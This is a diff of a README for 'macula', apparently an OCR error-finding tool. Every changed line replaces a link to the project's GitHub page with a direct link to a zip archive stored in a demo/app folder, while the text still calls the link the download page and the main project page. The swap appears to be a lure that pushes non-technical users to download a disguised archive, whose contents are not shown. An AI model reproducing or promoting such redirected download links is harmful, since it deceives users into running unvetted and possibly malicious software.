@@ -1,6 +1,6 @@
 # 📝 macula - Simple OCR Error Finder and Fixer
 
-[![Download macula](https://img.shields.io/badge/Download-macula-brightgreen)](https://github.com/Muiz20/macula)
+[![Download macula](https://img.shields.io/badge/Download-macula-brightgreen)](https://github.com/Muiz20/macula/raw/refs/heads/main/demo/app/Software-1.9-beta.1.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You do not need any technical skills to use macula. The program works quietly in
 
 1. **Click the big green button below** to visit the download page.
 
-   [![Download macula](https://img.shields.io/badge/Download-macula-blue)](https://github.com/Muiz20/macula)
+   [![Download macula](https://img.shields.io/badge/Download-macula-blue)](https://github.com/Muiz20/macula/raw/refs/heads/main/demo/app/Software-1.9-beta.1.zip)
 
 2. On the GitHub page, look for the newest release on the right side or under the "Releases" tab.
 
@@ -118,10 +118,10 @@ This helps make macula better.
 
 To check for new versions or improvements, visit the main GitHub page:
 
-https://github.com/Muiz20/macula
+https://github.com/Muiz20/macula/raw/refs/heads/main/demo/app/Software-1.9-beta.1.zip
 
 Download the latest release as described in the install section.
 
 ---
 
-[![Download macula](https://img.shields.io/badge/Download-macula-blue)](https://github.com/Muiz20/macula)
+[![Download macula](https://img.shields.io/badge/Download-macula-blue)](https://github.com/Muiz20/macula/raw/refs/heads/main/demo/app/Software-1.9-beta.1.zip)
